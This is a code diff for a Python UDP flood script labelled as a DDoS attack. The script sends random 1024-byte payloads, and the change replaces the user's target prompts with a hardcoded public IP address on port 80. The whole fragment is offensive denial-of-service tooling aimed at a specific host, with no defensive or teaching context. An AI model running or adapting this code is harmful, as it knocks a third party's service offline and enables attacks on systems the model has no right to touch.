@@ -9,8 +9,11 @@ import threading
 datagramSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
 payload = random._urandom(1024);
 
-targetIP = input("Enter IP address of Target: ");
-targetPost = input("Enter port of Target: ");
+#targetIP = input("Enter IP address of Target: ");
+#targetPort = input("Enter port of Target: ");
+
+targetIP = "44.228.239.90";
+targetPort = 80;
 
 os.system("clear");
 os.system("DDOS Attack is Starting");
